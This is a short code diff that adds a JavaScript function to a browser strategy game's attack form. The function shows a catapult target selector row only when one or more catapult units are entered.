+    // Catapult Target Selector Logic (module-scope so closeAttackModal can re-attach)
+    function updateCatapultTarget() {
+        var catapultInput = document.getElementById('unit_catapult');
+        var targetRow = document.getElementById('catapult_target_row');
+        if (catapultInput && targetRow) {
+            var catapultCount = parseInt(catapultInput.value) || 0;
+            targetRow.style.display = (catapultCount > 0) ? 'table-row' : 'none';
+        }
+    }
+
+</script>
